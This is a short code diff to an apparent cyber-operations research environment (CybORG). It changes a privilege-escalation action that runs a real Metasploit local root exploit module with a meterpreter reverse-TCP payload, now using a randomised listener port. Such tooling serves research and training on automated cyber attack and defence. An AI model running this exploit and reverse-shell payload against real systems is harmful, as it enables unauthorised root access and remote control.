@@ -4,7 +4,7 @@
 # pylint: disable=invalid-name
 from typing import Tuple
 from ipaddress import IPv4Address
-from random import choice
+from random import choice, randint
 
 from CybORG.Shared import Observation
 from CybORG.Shared.Actions.MSFActionsFolder.MSFPrivilegeEscalationFolder.MSFPrivilegeEscalation import MSFPrivilegeEscalation
@@ -179,16 +179,15 @@ class MSFSubUidShell(MSFPrivilegeEscalation):
         else:
           target_session = list(target_sessions.keys())[0]
           # get LHOST from the session tunnel_local
-          print("target session {}".format(target_sessions[target_session]))
-          tunnel_local = target_sessions[target_session]["tunnel_local"]
-          lhost = tunnel_local.split(":")[0]
-          # TODO: Valid tunnel_local is a valid IPv4 address
-          print(lhost)
+          #print("target session {}".format(target_sessions[target_session]))
+          lhost = self.get_lhost(target_sessions[target_session]["tunnel_local"])
+          lport = randint(4400,4500)
+
           output = session_handler.execute_module(mtype='exploit', 
                                          mname='linux/local/nested_namespace_idmap_limit_priv_esc',
                                          opts = { "SESSION": target_session },
                                          payload_name="linux/x86/meterpreter/reverse_tcp",
-                                         payload_opts={'LHOST': lhost, 'LPORT': 4455})
+                                         payload_opts={'LHOST': lhost, 'LPORT': lport})
           obs.add_raw_obs(output)
           obs.set_success(False)
           session = None
